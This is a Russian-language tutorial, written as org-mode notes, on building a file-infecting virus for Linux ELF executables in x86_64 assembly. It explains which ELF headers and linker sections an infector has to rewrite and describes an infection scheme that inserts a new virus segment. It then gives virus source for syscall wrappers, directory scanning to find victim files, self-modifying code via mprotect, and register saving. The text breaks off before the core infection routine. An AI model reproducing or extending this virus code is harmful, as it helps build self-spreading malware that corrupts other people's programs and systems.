#+STARTUP: showall indent hidestars
** Устройство эльфа
Зачем вообще нужны ELF файлы?
Нам нужно сообщать загрузчику, что мы хотим загрузить: как и с каких
адресов располагать сегменты кода, сколько места они занимают, какие
библиотеки нужны и нужны ли вообще и т.д. Всю эту информацию о программе
загрузчик черпает из эльфа.

Подробно о ELF-формате можно прочитать вот здесь:
https://refspecs.linuxfoundation.org/elf/elf.pdf

А чтоб посмотреть, как в эльфе все устроено, можно использовать утилиту
~readelf~ с разнообразными ключами.

*** Общее устройство эльф-файла
Эльф файл состоиз из:
- заголовка эльфа
- таблицы заголовков сегментов - заголовки сегментов просто идут один за
  другим, пока не кончатся. Их колчичество зависит от того, на сколько
  сегментов компилятор поделил код программы
- сам код программы - его-то мы и пишем + его дополняет компилятор
  (например, разделом кода PLT/GOT, который необходим при использовании
  динамических либ)
- таблица заголовков секций - заголовки так же идут один за другим.

Секции - это тоже разннобразный код. Отличие секций от сегментов в том,
что секции меньше, они объединяются в сегменты кода. У каждой секции есть
свое назначение (как и укаждого сегмента).
В англоязычных источниках заголовки сегментов часто упоминаются как
~program header~, т.е. заголовки программ.

*** Заголовок эльфа
Это структура, которая содержит в себе информацию о
точке входа - метка ~start~ программы, -  количестве заголовков сегментов,
их размере, их смещении от начала файла, количестве загоолвков секций, их
размере, где их искать в файле и т.д.

Чтоб посмотреть заголовок эльфа, можно использовать ~readelf -h
elf_filename~

*** Таблица заголовков программ
Представляет собой несколько заголовков программ (сегментов), которые
идут один за другим.
Первый заголовок этой таблицы описывает всю таблицу - сколько места
занимает, какое смещение и т.д. Заголовок такого типа может быть в файле
в единственном числе, потому что в файле может быть только одна таблица
сегментов.

Каждый заголовок представляет собой структуру, описывающую один сегмент кода. Эта
структура содержит в себе информацию о типе сегмента (загружаемый -
т.е. загрузчик загрузит его в память процесса, только для чтения и т.д.) его размере,
смещении, виртуальном адресе и т.д.

Количество заголовоков сегментов зависит от количества сегментов в
программе.
Каждый заголовок на моей архитектура занимает 56 байт.
Опираясь на эти заголовки программ, загрузчик понимает, что ему грузить,
куда и откуда, а так же какого типа этот код - он же должен выставить
атрибуты (права) страницам памяти, в которые он грузит код. Чтоб,
например, код, предназначенный только для чтения, не был воспринят как
исполняемый.

Затем идет весь код программы, который написал программист и дополнил
компилятор.

Заголовки сегментов можно посмотреть с помощью  ~readelf -l elf_filename~
*** Таблица заголовков секций
Эта таблица заголовков замыкает собой эльф-файл. Ее устройство похоже на
устройство талицы заголовков сегментов.

Каждый заголовок описывает одну секцию кода, сообщая, где она лежит в
файле, ее виртуальный адрес, тип и т.д. Как и в случае с заголовками
сегментов, есть типы заголовков, которые могут встречаться лишь однажды в
файле - поскольку код, который они описывают, может быть в файле только в
единственном экземпляре.

Например, не может быть в одном файле двух секций ~dynamic~ или двух
таблиц ~GOT~.

Заголовки сегментов можно посмотреть с помощью  ~readelf -S elf_filename~
Об устройстве эльфа подробно и довольно просто написано вот здесь
https://stevens.netmeister.org/631/elf.html


** Какие секции и сегменты критично важны для корректной работы эльф-файла

Вообще, если секция или сегмент есть в файле, значит они нужны, компилятор абы что в
файл пихать не будет - очевидная мысль, я знаю.

Но некоторые секции и сегменты кода критически важны для правильной загрузки и
исполнения эльф-файла. Если мы во время заражения как-то неправильно
отредактируем их, то файл либо не загрузится, либо не слинкуется, либо
завершит исполнение сегфолтом.

Критически важна информация, содержащаяся во всех заголовках: в
заголовках секций, сегментов и самого эльфа. Как было уже сказано выше,
именно из них черпается информация, каким образом следует разместить эльф
в памяти.

Если наш эльф файл собран с без каких-либо библиотек, например, он
написан на ассмеблере, и ему не требуется ~libc~, которая обеспечивает
корректный старт любой сишной программы, то корректного редактирования
заголовков будет достаточно, чтоб правильно оформить вставку кода
вируса.

Но если файл собран с либами, то все становится значительно веселее,
потому что в игру вступает линкер, механизм PLT/GOT и "ленивое" (или нет,
если выставить соответствующий флаг при компиляции программы)
связывание.

Для корректной работы линкера необходимы секции
- ~rela~ - их может быть несколько в файле
- ~dynamic~ - она бывает только одна
- ~got~ - она так же бывает только в единственном числе
- ~symtab~ - опять же в единственная и неповторимая

Секции типа ~rela~ содержат в себе информацию о ~релокейтах~. Именно
оттуда линкер берет информацию, какие символы необходимо связать, кким
образом это сделать и где будет находиться этот символ в программе -
т.е. его виртуальный адрес.
Посмотреть, как выглядит секция ~rela~ можно, использовав ~readelf -r elf_name~

Секция ~got~ - содержит в себе таблицу ~GOT~, которая содержит в себе
адреса, на которые мы переходим в случае, когда вызывается библиотечная
функция. О механизме ~PLT/GOT~ можно прочитать вот тут
http://rigidus.ru/doc/got-plt.html

Секция ~symtab~ представляет собой таблицу символов, где каждая запись -
это имя символа (название функции, переменной и т.д.) и адрес, по
которому этот символ объявлен.

Подробно о символах написано здесь
https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/
Посмотреть, как выглядит секция ~symtab~ можно, использовав ~readelf -s elf_name~

Ну и самая важная в этом списке секция ~dynamic~.
Именно из нее линкер во время загрузки (да, линкер вызывается и во время
загрузки, чтоб связать библиотеки друг с другом, например, и во время
рантайма, если у нас используется "ленивое" связывание) берет информацию,
где искать секции ~rela~, ~got~ и др. Соответственно, если информация в
секции ~dynamic~ не соответствует тому, где на самом деле расположен код,
программа завершится сегфолтом до того, как на нее фактически будет
передано управление.

Посмотреть, что находится в секции ~dynamic~ в эльфе можно, используя
~readelf -d elf_name~.

Поэтому если ваш алгоритм заражения предполагает, что код жертвы
сдвинется в файле в ту или иную сторону, то вам нужно держать в уме
называнные секции. Иначе вас ждут увлекательные часы отладки (как это
было со мной).


*** TODO описать работу линкера и релокетойв подробно, дать ссылки на используемые источники.

** Заражение файла
*** Используемые технологии
- язык реализации вируса ~GNU asm x86_64~
- компилятор ~gcc~
- средства отладки: ~objdump~, ~gdb~ и ~readelf~


Вирус написан на ассмеблере, поскольку ассемблер мало весит, но при этом
обладает всеми необходимыми выразительными средствами для написания
вируса. К тому же, было решено собирать вирус без сишных либ, поскольку
это облегчает заражние - вирус становится меньше и зависит только сам от
себя, а не от слинкованных библиотек.

Если вы в глаза не видели никакой ассемблер, вот тут есть краткий
справочник.
http://flint.cs.yale.edu/cs421/papers/x86-asm/asm.html

*** Идея заражения
Как заразить файл? С чего начать?
Есть несколько наименее сложных вариантов, они неплохо описаны в книге Криса Касперски
"Записки исследователя компьютерных вирусов".

У меня же вариант такой: вирус располагается в файле сразу после кода
жертвы - то есть в том месте, где раньше у нее начинались заголовки
секций. Поскольку код вируса не является продолжением какого-либо
сегмента кода жертвы, то его придется оформлять в отдельный сегмент, а
следовательно, создавать для него отдельный заголовок сегмента и
отдельный заголовок секции.

Фактически, нам нужно просто найти место для вставки вируса,
сгенерировать его заголовки, пересчитать секции, которые я упоминал выше,
и вставить код вируса в файл. Выглядит несложно, правда?
Ну, первое впечатление обманчиво :)

Пожалуй, я расскажу, с какими проблемами столкнулся я, и как я их
решал, что ответит на вопрос, почему был выбран именно такой способ
заражения, хотя есть еще проще.

*** Мои ошибки на пути вирусописания
~Ошибка №1~
Сев писать вирус, я ничего не знал о том, как загружается и линкуется
программа. Более того, я даже не думал, что это может пригодиться
каким-то образом. Если бы я с самого начала знал, как все работает, это
сэкономило бы мне пару недель жизни, не меньше.

Восполняя свой пробел, я использовал следующие источники:
https://www.ques10.com/p/21825/explain-working-of-a-direct-linking-loader-with--1/
https://lwn.net/Articles/631631/
https://amir.rachum.com/blog/2016/09/17/shared-libraries/#example-setup
https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-vi.html

~Ошибка №2~
Я ничего не знал о старте и завершении сишной программы.
То есть я представлял себе это так: есть вот метка ~_start~, с нее
начинается исполнение проги. Внутри ~_start~ как-то там настраивается
стек и библиотеки, а потом передается управление на ~main~, а после того,
как мы из ~main~ вышли, мы как-то корректно завершаем программу.

В общем, если б я знал и это - а старт сишной проги, как и ее завершение,
тестно связаны с процессом линковки, - то это сэкономило бы мне еще
примерно неделю.

Так что пришлось почитать еще и вот это
https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html
и самому исследовать все под ~gdb~.

~Ошибка №3~
Прежде чем писать вирус, наверное, следовало бы внимательно взглянуть на
код жертвы, который генерирует мой компилятор. Что он там делает? Как это
работает?

Но я не стал. Ведь компилятор всегда прав, и я наивно полагал, что не
стоит ждать от него подлянки. О, как я ошибался.

Моя версия ~gcc~ генерирует ~позиционно-зависимый~ код. Это значит, что
даже если я совершенно идеально перечитаю все данные, необходимые для
корректной загрузки, линковки и исполнения программы, то моя жертва все
равно будет упорно выдавать сегфолты: где-то внутри нее, например в
секциях кода ~frame_dummy~, ~register_tm_clones~ и даже в самом ~start~ в
регистры кладутся абсолютные адреса, которые затем либо вызываются, либо
используются как параметры функций.

В результате, даже если код жертвы сдвинулся хоть на байт - а мы как бы
собирались вставлять целый заголовок вируса, что сдвигает код жертвы на
56 байт - не заработает просто ничего. Поэтому пришлось решать проблему с
урегулированием всех ссылок - как я это сделал, читайте дальше.

~Ошибка №4~
Которая является продолжением всех остальных.

Сев писать вирус и начитавшись Касперси, решил использовать самую простую
модель заражения:
- находим первый загружаемый сегмент кода (обычно в нем располагается
  метка ~_start~)
- находим в нем последнюю секцию
- вписываем вирус сразу после этой последней секции
- расширяем зараженную секцию и зараженный сегмент на размер вставляемого
  вируса (редактируем их заголовки)
- редактируем все остальные заголовки сегментов и секций - раз мы
  вставляем вирус, то весь остальной код жертвы "съедет" вниз в файле и в
  памяти на его размер
- редактируем все секции, какие нам необходимо
- перезаписываем инфицированный эльф

Этот способ позволяет не генерировать дополнительные заголовки, а так же
чуть менее заметен для антивируса.
И это хороший способ заразить файл, если бы не секции ~.plt~ и
~.got~. Хотя ~.plt~ и использует позиционно-независимый код, чтоб
обращаться к записям в ~got~, нам необходимо, чтоб расстояние между
этими секциями не менялось - иначе ~.plt~ будет продолжать обращаться к
~got~, которой уже нет на том месте.

И к сожалению, ~plt~ находится до первого загружаемого сегмента, а ~got~ -
после. И это знчит, что вставляя наш вирус в первый загружаемый сегмент
кода, мы значительно увеличиваем расстояние между этими секциями. В
результате чего программа жертвы выдает сегфолт.

Знающие люди подумали бы, что после того, как вирус отработает в жертве,
можно было бы сместить код жертвы так, чтоб затереть вирус, вернув все на
прежние адреса - тогда жертва спокойно отработала бы. Но мне этот способ
пришел в голову только когда я уже отказался от этой модели заражения,
избрал описанную выше и наткнулся на позиционно-зависимый код моего
компилятора.

~Ошибка №5~
Пока пишешь вирус, нужно думать не только о том, как он будет работать из
своего родного файла - это очевидно - но и о том, как он будет работать
из инфицированного файла.

И на самом деле между этими двумя состояниями есть разница, хотя код
формально один и тот же.
Например, весь ваш код должен быть позиционно-независимым. Вы не можете
использовать абсолютную адресацию, только косвенную. Потому что когда
ваше вирус окажется в чужом файле, его адреса изменятся.

К тому же, если, предположим, вы используете переменные. По умолчанию
внутри них значение ноль. Некоторые могут не заполняться по мере
исполнения вируса в одном случае, и заполняться в другом.

Когда вы записиываете код вируса в инфицированный файл, то вместе с кодом
вы записываете и переменные с теми значениями, которые в них оказалисьна
момент записи вируса в файл.
Поэтому когда вирус начнет работать в инфицированном файле, то эти
переменные уже не будут заполнены нулями - в них будут какие-то други,
старые значения.

Представляете себе пространство для ошибок?
Поэтому пока пишете вирус, всегдай думайте, как он будет исполняться из
чужого файла.

*** Суммируем общую идею заражения
- найти место, куда вставлять вирус - в нашем случае это адрес таблицы
  заголовков секций, а сами они "съедут" вниз в файле
- создать заголовки для вируса
- пересчитать все, что должно быть пересчитано
- создать механизм, который позволит сдвигать код инфицированной жертвы на ее прежние
  адреса в памяти процесса после того, как вирус отработает
- вписать все в файл

** Подробный разбор вируса
*** Принципы работы вируса

Чтоб вирус в будущем был расширяемым, мы будем писать небольшие куски
кода, каждый из которых будет совершать строго ограниченный набор
действий - например, только искать заголовки секций, или только искать
секцию ~dynamic~.


Наши функции за редким случаем не будут пинимать параметров. Вместо этого
они будут брать значения из глобальных переменных и смотреть,
удовлетворяют ли эти значения их требованиям. Напримр, чтоб найти секцию
~.got~, нужно сначала найти секцию ~dynamic~, поэтому функция сначала
проверит, если данные ~dynamic~ уже.

В качестве возвращаемого значения функции возвращают в ~rax~ 0 - в случае
успеха - и -1 - в случае провала.

Это делает вирус расширяемым и легко поддерживаемым. В будущем функции
можно преобразовать в систему правил, где правило может подойти или не
подойти, а если не подошло ни одно правило, то вирус завершится.
А из системы правил мы вполне можем создать систему принятия решений,
когда вирус будет комбинировать правила для заражения файла, даже если
его формат ему не знаком.

*** Отладочный вывод
Наверное, прежде чем что-то писать, надо позаботиться об отладке. Нам
нужен вывод ошибок, а писать его вручную каждый раз - занятие муторное.
Поэтому сделаем макрос, который будет выводить ошибки и завершать
исполнение вируса, не дожидаясь сегфолта, если мы находимся в
дебаг-моде.

#+NAME: _debug_msg
#+BEGIN_SRC asm
  /// Если эта переменная существует,
  /// макросы будут генерировать отладочный вывод

      .set DEBUG_MODE, 1

      // Макрос для генерации сообщений об ошибках

      .macro ERR_MSG name msg
          .ifdef DEBUG_MODE
              \name\()_error:
                  lea     \name\()_msg_e(%rip), %rsi
                  mov     $len_e_\name, %rdx
                    jmp     _error_msg
              \name\()_msg_e:
                  .ascii "ERR: \msg\()\n"
                  .set len_e_\name, . - \name\()_msg_e
          .else
              \name\()_error:
                  jmp     \name\()_exit
          .endif
      .endm

#+END_SRC

*** Реализация библиотечных функций
Итак, если помните, вирус у нас собран без использования сишных
библиотек вообще. А тем не менее надо как-то открывать, закрывать файлы,
писать в них, печатать сообщения и т.д. Поэтому реализуем библиотечные функции
самостоятельно - разуммется, не целиком, а только ту часть, что нам
нужна.

Для этого нам понадобится авызывать разнообразные ~syscall~ и передавать
им параметры.
Номера ~syscall~ можно посмотреть вот тут
https://filippo.io/linux-syscall-table/
А как передавать прааметры можно выяснить, исследуя вызовы библиотек под
~gdb~.

Данная функция позволяет напечатать сообщение в ~stdout~
#+NAME: _my_write
#+BEGIN_SRC asm

  /// WRITE TO STDOUT
  /// @PARAMS
  ///   - %RSI - msg pointer
  ///   - %RDX - msg size
  _my_write:
      mov      $0x1, %rax          # write
      mov      %rax, %rdi          # to stdout
      syscall
      ret

#+END_SRC

Может возникнуть ситуация, когда длина строки, как и сама строка,
неизвестны на этапе компиляции вируса, а вывести нам ее во время
исполнения надо.
Так что реализуем ~strlen~

#+NAME: _my_strlen
#+BEGIN_SRC asm
  /// _MY_STRLEN
  /// PARAMS -
  /// RDI - указатель на строку
  /// Изменяет STRING_LENGTH
  _my_strlen:
      xor     %rax, %rax

      push    %rcx
      push    %rbx

      test    %rdi, %rdi
      je      _my_strlen_fail
      // je      _my_strlen_error

      mov     $0x64, %rcx
      repne   scasb

      mov     $0x64, %rbx
      sub     %rcx, %rbx
      mov     %rbx, %rax
      dec     %rax

      mov     %rax, string_length(%rip)
      xor     %rax, %rax

      jmp    _my_strlen_exit

  _my_strlen_fail:
      mov     $-1, %rax

  _my_strlen_exit:
      pop     %rbx
      pop     %rcx

      ret

      ERR_MSG _my_strlen "_my_strlen: NULL pointer"

#+END_SRC

Этот крошечный код позволяет открыть файл - он настолько маленький, что я
не стал оформлять его в отдельную функцию

В регистре RDI он принимает указатель на имя файла, а RSI - флаги (файл
открываем на чтение/запись/оба).

#+NAME: _my_open
#+BEGIN_SRC asm

      mov     $0x2, %rax  # fopen syscall
      syscall
#+END_SRC

Этот системный вызов позволяет смаппить - т.е. загрузить в память - все
содержимое открытого файла. Это позволит нам загрузить жертву в память,
распарсить ее - мы ж хотим узнать о ней все - отредактировать прямо в
памяти, а затем слить оттуда в файл.

После вызова в RAX мы получим адрес, по которому лежит файл в памяти, или
же отрицательное значение, если произошла какая-то ошибка.
#+NAME: _my_mmap
#+BEGIN_SRC asm

  /// MY_MMAP file into memory
  /// Считывает файл в память по заданному адресу.
  /// Флаги должны быть такими же, какие передавали
  /// open для открытия файла.
  /// @PARAMS
  ///  - %RDI - адрес для записи (по умолчанию NULL,
  ///           в этом случае назначается OS)
  ///  - %RSI - длина считываемого файла
  ///  - %RDX - права доступа к памяти
  ///           (RDONLY, RDWR и т.д.)
  ///  - %RCX -  права для доступа к памяти для
  ///            процессов (MMAP_SHARED, MMAP_PRIVATE)
  ///  * %R8 -   fd считываемого файла
  ///  * %R9 -   offset от начала считываемого файла
  /// @ RETURN VALUE
  /// * RAX - указатель на файл в памяти или отриц. заначени
  _my_mmap:
      push %rbx
      push %rcx
      push %rdx
      push %rbp
      push %r10

      mov %r9, %r15
      mov %rsi, %r13
      mov %rdi, %r12
      mov %ecx, %r14d

      movslq %r8d, %rbp
      movslq %edx, %rbx
      movslq %r14d, %r10
      mov $0x9, %eax

      syscall

      pop %r10
      pop %rbp
      pop %rdx
      pop %rcx
      pop %rbx
      ret

#+END_SRC

Кто прочитал комментарии к ~_my_mmap~ заметил, что в RSI ~_my_mmap~
принимает длину считываемого файла. Как получить это значение, не
используя черную магию?

В этом нам поможет реализация ~my_stаt~, которая узнает свойства файла, в
том числе и его размер.

#+NAME: _my_stat
#+BEGIN_SRC asm

/// MY_STAT
/// @PARAMS
/// %RDI - file name
/// %RSI - stat struct pointer
_my_stat:
    push    %rcx
    mov     $0x04, %rax

    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop     %rcx
  	ret

    ERR_MSG _my_stat "my_stat"

#+END_SRC

А теперь на основе ~_my_mmap~, ~_my_stat~ и ~_my_open~ соберем функцию ~openfile~,
которая является аналогом сишного ~fopen~: она будет принимать имя файла
и права, открывать файл и мапить его в память. В случае успеха вернет в
~RAX~ указатель на начало файла в памяти, иначе - минусовое значение.

#+NAME: _openfile
#+BEGIN_SRC asm
  /// OPENFILE
  /// Открывает файл с указанными флагами,
  /// маппит его в память
  ///
  /// @PARAMS:
  /// - %RDI - file name
  /// - %RSI - flags
  ///
  /// @RET:
  /// - %RAX - указатель на файл в памяти
  /// или отричательное значение
  _openfile:
      push    %rbp
      mov     %rsp, %rbp

      mov     $0x2, %rax  # fopen syscall
      syscall
      test    %rax, %rax

      jl      _openfile_exit

      // save all regs
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %r9
      push    %r10

      # сохранить дескриптор жертвы
      mov     %rax, fd(%rip)

      // space for local vars
      sub     $0xA0, %rsp

      mov     %rax, %rcx          # fd
      mov     %rsi, %rdx          # openfile flags

      // call stat
      // (need no less 0xA0 for struct stat)
      // leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
      leaq    -0xD0(%rbp), %rsi   #  stat struct ptr
      call    _my_stat

      // prepare params for mmap
      mov     %rcx, %r8           # fd
      mov     %rdx, %rax          # flags
      xor     %rdi, %rdi          # addr

      // 0x70 - offset to filesz field in stat struct
      // mov     -0x70(%rbp), %rsi   # filesz
      mov     -0xA0(%rbp), %rsi   # filesz
      mov     %rsi, file_sz(%rip)
      xor     %r9, %r9            # offset

      // doesn't need shared mmap
      mov     $MAP_PRIVATE, %rcx

      mov     $O_RDONLY, %rbx
      cmp     %rbx, %rax
      je      mmap_rdonly

      // define mmap flags
      mov     $O_RDWR, %rbx
      cmp     %rbx, %rax
      jne     _openfile_flags_error

  mmap_rdwr:
      mov     $(PROT_READ | PROT_WRITE), %rdx # prot
      jmp     call_my_mmap

  mmap_rdonly:
      mov     $PROT_READ, %rdx            # prot
      // call mmap
  call_my_mmap:
      call    _my_mmap

      // recover stack
      add     $0xA0, %rsp
      pop     %r10
      pop     %r9
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx

  _openfile_exit:
      pop     %rbp
      ret

      ERR_MSG _openfile_neg_fd "openfile neg fd"
      ERR_MSG _openfile_flags "openfile undefined flags"
      ERR_MSG _openfile_ptr "openfile returned zero ptr"

#+END_SRC

Так же мыхотим иметь возможность записать инфицированный код в файл. Для
этого мы будет использовать ~pwrite~. Его отличие от ~write~ состоит в
том, что ему можно указать смещение в файле, по которому он должен
писать, в то время как ~write~ будет писать сначала файла.
Это позволяет нам записывать инфицированный код в файл по кускам: а нам
это понадобится, поскольку, как минимум, нам нужно вписывать новые
заголовки вируса и сам вирус.

~pwite~ принимает:
- RDI - десктриптор файла, куда пишем
- RSI - адрес, по которму лежит то, что мы хотим записать
- RDX - размир записываемого
- RCX - смещение в файле, от которого пишем
- R10 - аналогично ~rcx~ (если нет загрузить смещени R10 тоже, то ~pwite~
  работает просто как ~write~)
#+NAME: _my_pwrite
#+BEGIN_SRC asm
    mov     $0x12, %rax   # syscall pwrite
    syscall

#+END_SRC

Даже человек, который ничего не знает вирусах, понимает, что эти вирусы
как-то размножаются по системе.
Самый простой вариант - это искать исполняемые файлы в папке и заражать
их, если они все еще не заражены.

Мы ограничимся только текущей папкой, чтоб случайно не перезаразить все
на нашем компе.

Для чтения директории в си есть прекрасная функция ~readdir~, которую мы
сейчас и реализуем.

~readdir~ работает следующим образом: она открывает заданную директорию (
у нас она указана в переменной ~dir_name~) и вызывает системный вызов
~getdents~, который считает все записи из каталога в буфер ~dir_buf~.
Таким образом мы получаем структуры записей всех файлов и папко в
заданном каталоге. В каждой такой структуре содержится и имя файла.
Так же мы сохраним указатель на первую структуру в буфере - это позволит
сдвигать указатель на следующую структуру файла, чтоб добыть его имя,
если предыдущий файл не подошел для заражения по какой-то причине.

#+NAME: _my_readdir
#+BEGIN_SRC asm
  /// Открывает директорию
  /// и считывает все ее записи в буфер
  _my_readdir:
      push    %rdi
      push    %rsi
      push    %rbx

      // открыть директорию
      lea     dir_name(%rip), %rdi
      mov     $0x0, %rsi
      mov     $0x2, %rax  # fopen syscall
      syscall
      test     %rax, %rax
      jl      _my_readdir_open_error

      // заполянем структуру потока
      lea     dir_struct(%rip), %rbx
      mov     %eax, (%rbx)
      movq    $0x8000, 0x8(%rbx) # размер буфера


      // параметры getdents
      mov     (%rbx), %rdi
      lea     dir_buf(%rip), %rsi
      mov     8(%rbx), %rdx

      // вызов getdents
      mov    $0x4e, %rax
      syscall

      // в случае успеха возвращ.
      // кол-во считанных байт
      // иначе 0
      cmp     $0x0, %rax
      jle     _my_readdir_read_error

      // сохранили указатель на первую структуру
      // в буфере
      lea     dir_buf_ptr(%rip), %rbx
      mov     %rsi, (%rbx)

      xor     %rax, %rax
      pop     %rbx
      pop     %rsi
      pop     %rdi
      ret

      ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
      ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"

#+END_SRC
Вирусу нужно обеспечить корректное завершение.

Обычно программа завергается инструкицией ~ret~, но не в нашем
случае, поскольку ~ret~ берет со стека адрес возврата в систему. А у нас
его не будет - мы же не настраиваем стек с помощью ~libc~. Если
использовать ~ret~, товирус завершится сегфолтом.
Поэтому мы реализуем ~exit~

#+NAME: _my_exit
#+BEGIN_SRC asm
  /// выход из инфектора
  _global_exit:
      mov $0x3c, %rax
      mov $0x0,  %rdi
      syscall
#+END_SRC

*** Подготовка работы вируса
Теперь самое интересное.
Чтоб вирус было легче записывать в файл жертвы,
нам нужно, чтоб весь его код находился в секции ~.text~ - так мы можем
записывать его одним вызовом. Но тем не менее, мы хотим использовать
переменные. И тут у нас проблема: переменные - это ~data~, если сделать
их частью ~.text~, то при поптыке записать что-то в них, нам ждет
сегфолт - ведь ~.text~ по умолчанию может только исполняться, а записыват
в него что-то во время исполнения нельзя.

Что делать?
Выход только один - разрешить коду вируса самомодификацию. И в этом нам
поможет ~mprotect~.

~mprotect~ позволяет изменить атрибуты страницы памяти процесса. То есть ели у нас
была страница памяти только на чтение, то вызвав ~mprotect~ с правами на
чтение и запись, мы разрешим этой странице чтение и запись.

В качестве параметров ~mprotect~ принимает:
- RDI - адрес страница памяти, атрибутф которой мы хотим изменить (адрес
  обязательно должен быть выровнен по 4КБ)
- RSI - размер в байтах - на каком отрезке страницы памяти мы меняем атрибуты
- RDX - новые атрибуты

Суммирую это, мы разрешаем самомодификацию кода вируса.

#+NAME: _my_mprotect
#+BEGIN_SRC asm
  /// Разрешает коду вируса писать
  /// в самого себя
  _allow_write_into_code:
      push    %rdx
      push    %rcx
      push    %rdi
      push    %rsi

      lea     _start(%rip), %rdi
      and     $~0xFFF, %rdi       # ..in %RDI
      lea     _fin_infector(%rip), %rsi   # get end addr

      sub     %rdi, %rsi          # total size - %RSI
      mov     $0x7, %rdx          # RW+EXEC flags - $RDX
      mov     $0xA, %rax          # mprotect handle
      syscall

      test    %rax, %rax
      jne     _allow_write_into_code_error

      mov     %rax, mprotect_ok(%rip)
  _allow_write_into_code_exit:
      pop     %rsi
      pop     %rdi
      pop     %rcx
      pop     %rdx

      ret

      ERR_MSG _allow_write_into_code "mprotect in _start"
#+END_SRC

Есть еще критичные для выполнения задачи, которые нужно решить до
запуска вируса:
- настройка стека - раз мы не используем сишные либы, то стек надо
  настроить вручную
- сохранить все регистры, какими они были до старта прогаммы.
Для самого вируса значения, которые оставил загрузчик в регистрах,
совершенно неважны, но для инфицированной жертвы эти значения важны
критично - например, в регистре ~rdx~ загрузчик оставляет адрес
~_dl_fini~ - именно эта часть библиотеки ~libc~ обеспечивает сишной
программе корректное завершение. Если этот адрес потеряется, то сишная
программа завершится сегфолтном.
- восстановление регистров - раз соххранили, то после исполнения вируса
  надо восстановить значения

Вместо того, чтоб настраивать аппаратный стек, мы создадим свой. Для
этого нужно просто зарезервировать место в памяти, а затем загрузить
адрес начала стека в ~rsp~ - и все, дальше ~pop~ и ~push~ буду делать
свое дело.

#+NAME: _my_stack
#+BEGIN_SRC asm
  _stack_top:
      .space 6000, 0

  _stack_bottom:
      .quad 0

#+END_SRC

Так же хотелось бы иметь возможно по завершении вируса проверять, не
переполнен ли стек - ну мало ли, какой баг мы там закодили.

Так что установим "канарейку"
#+NAME: _check_canary
#+BEGIN_SRC asm
  #define CANARY_VAL 0xDEADBEEFBAADF00D

      // Марос для проверки, не переполнен ли стек
      .macro CHECK_CANARY
          .ifdef DEBUG_MODE
              mov     _canary(%rip), %rax
              mov    $CANARY_VAL, %rbx
              cmp    %rax, %rbx
              je      1f              # forward label 1
              lea     2f(%rip), %rsi  # forward label 2
              mov     $len_e_canary_\@, %rdx
              jmp     _error_msg
          2:
              .string "ERR: canary \@\n"
              .set len_e_canary_\@, . - 2b
          1:
          .endif
      .endm
#+END_SRC

Теперь можно сохранить регистры и присвоить ~rsp~ новое значение.
Сохраняем все регистры кроме ~rax~,  поскольку он уже изменен - а
неизменить его мы не можем.

Обратите внимание, что ~_save_registers~ завершается не ~ret~, а
джампом - поскольку мы изменили ~rsp~, он уже указывает не на адрес
возврата из функции, а в новый стек.
#+NAME: _save_registers
#+BEGIN_SRC asm
  /// Сохраняет все регистры кроме rax -
  /// он уже изменен - в переменные и
  /// настраивает стек
  /// Проверяет MPROTECT_OK
  _save_registers:
      mov     mprotect_ok(%rip), %rax
      test    %rax, %rax
      jne     _save_registers_fail

      mov     %rsp, old_rsp(%rip)
      lea     _stack_bottom(%rip), %rsp

      mov     %rbx, old_rbx(%rip)
      mov     %rdx, old_rdx(%rip)
      mov     %rcx, old_rcx(%rip)
      mov     %rdi, old_rdi(%rip)
      mov     %r8, old_r8(%rip)
      mov     %r9, old_r9(%rip)
      mov     %r10, old_r10(%rip)
      mov     %r11, old_r11(%rip)
      mov     %r12, old_r12(%rip)
      mov     %r13, old_r13(%rip)
      mov     %r14, old_r14(%rip)
      mov     %r15, old_r15(%rip)

      xor     %rax, %rax
      jmp     _save_registers_exit

  _save_registers_fail:
      mov     $-1, %rax

  _save_registers_exit:
      jmp     _prepare_data

#+END_SRC

А вот так мы возвращаем регистрам исходные значения.

#+NAME: _my_stack
#+BEGIN_SRC asm
      /// Возвращает регистры в состояние
      /// до исполнения вируса
      _restore_registers_and_stack:
          mov     old_rsp(%rip), %rsp     # restore old %RSP
          mov     old_rbx(%rip), %rbx
          mov     old_rdx(%rip), %rdx
          mov     old_rcx(%rip), %rcx
          mov     old_rdi(%rip), %rdi
          mov     old_rsi(%rip), %rsi
          mov     old_r8(%rip), %r8
          mov     old_r9(%rip), %r9
          mov     old_r10(%rip), %r10
          mov     old_r11(%rip), %r11
          mov     old_r12(%rip), %r12
          mov     old_r13(%rip), %r13
          mov     old_r14(%rip), %r14
          mov     old_r15(%rip), %r15

      <<_my_exit>>
#+END_SRC

Помните, что я говорил о переменных и своей ~ошибке №5~?
Перед каждым запуском вируса нужно очистить значения в них до "по
умоланию". В моем случае это нулевое значение, а в некоторых случаях -1.

Если этого не сделать, то отлаживаться вы будете долго и мучительно.

В этом нам поможет функция ~clear_array~. Она принимает два адреса:
~from~ - с какого адреса нужно заполнить байты нулями, и ~to~ - до какого
адреса заполнять.

Затем высчитывает разницу между этими точками и заполняет все между ними
нулями.
#+NAME: _clear_array
#+BEGIN_SRC asm
  /// _CLEAR_ARRAY
  /// Заполняет все нулями
  /// с точки from до точки to
  _clear_array:
      push    %rcx

      mov     clear_from(%rip), %rax
      test    %rax, %rax
      je      _clear_array_fail

      mov     clear_to(%rip), %rcx
      test    %rcx, %rcx
      je      _clear_array_fail

      sub     %rax, %rcx
  _clear_array_cycle:
      movb    $0x0, (%rax)
      inc     %rax
      loop    _clear_array_cycle

  _clear_array_success:
      xor     %rax, %rax
      jmp     _clear_array_exit

  _clear_array_fail:
      mov     $-1, %rax

  _clear_array_exit:
      pop     %rcx
      ret
#+END_SRC

А вызовет нам ее функция ~_clear_old_data~, которая установит во все
переменные значения по умолчанию.

#+NAME: _clear_old_data
#+BEGIN_SRC asm
  /// Очищает все переменные,
  /// занося в них значения "по умолчанию"
  _clear_old_data:
      push    %rbx
      leaq    clear_from(%rip), %rax
      leaq    clear_to(%rip), %rbx

      mov     %rbx, clear_to(%rip)
      mov     %rax, clear_from(%rip)

      call    _clear_array

      movq    $-1, parse_success(%rip)
